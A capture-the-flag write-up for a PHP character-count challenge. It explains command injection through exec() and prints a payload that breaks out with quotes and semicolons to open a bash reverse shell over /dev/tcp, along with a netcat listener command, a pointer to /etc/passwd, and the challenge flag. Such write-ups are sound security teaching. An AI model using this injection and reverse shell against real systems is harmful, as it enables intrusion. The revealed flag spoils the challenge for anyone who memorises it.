# Body Count

Author: [AJ1479](https://github.com/AJ1479) and [roerohan](https://github.com/roerohan)

## Description

This challenge is based on PHP code injection to set up a reverse shell. 

## Requirements

- Docker: [Dockerfile](./Dockerfile)

## Sources

```
Here's a character count service for you!
```

## Exploit

This challenge deals with PHP code injection, you need to enter some code which will help you create a reverse shell.
<br />

The characters are counted using the `wc` command in the `exec()` function in the PHP. This is where you'll have to enter code to open a reverse shell. Something like `'; bash -c "bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"; '`(using semicolons to end the commands) with your server's IP address (instead of 127.0.0.1) and start a netcat listener (`nc -l -p 8000`) on your server. Then, navigate to the `/etc/passwd` to get the flag.
<br />

The flag is:

```
csictf{1nj3ct10n_15_p41nfu1}
```